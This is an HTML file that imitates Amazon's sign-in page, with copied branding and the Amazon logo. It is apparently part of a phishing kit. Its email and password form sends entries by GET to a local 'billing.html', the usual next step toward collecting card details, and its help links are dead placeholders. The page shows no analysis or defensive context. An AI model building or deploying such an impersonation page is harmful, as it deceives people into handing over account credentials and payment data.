<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Amazon Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* Basic styling for login page */
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f3f3f3;
        }

        .container {
            width: 100%;
            max-width: 400px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            max-width: 150px;
        }

        h1 {
            font-size: 24px;
            color: #131921;
            text-align: left;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .input-field:focus {
            outline: none;
            border-color: #ff9900;
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #ff9900;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 500;
        }

        .submit-btn:hover {
            background-color: #e68900;
        }

        .forgot-password,
        .create-account {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a,
        .create-account a {
            color: #0066c0;
            text-decoration: none;
        }

        .forgot-password a:hover,
        .create-account a:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>

<div class="container">
    <!-- Amazon Logo -->
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
    </div>

    <!-- Sign In Heading -->
    <h1>Sign-In</h1>

    <!-- Login Form -->
    <form action="billing.html" method="GET">
        <!-- Email or Phone -->
        <input type="email" id="email" name="email" class="input-field" placeholder="Email or mobile phone number" required>

        <!-- Password -->
        <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>

        <!-- Sign-In Button -->
        <button type="submit" class="submit-btn">Sign-In</button>
    </form>

    <!-- Forgot Password Link -->
    <div class="forgot-password">
        <a href="#">Forgot your password?</a>
    </div>

    <!-- Create Amazon Account -->
    <div class="create-account">
        <p>New to Amazon?</p>
        <a href="#">Create your Amazon account</a>
    </div>
</div>

</body>
</html>
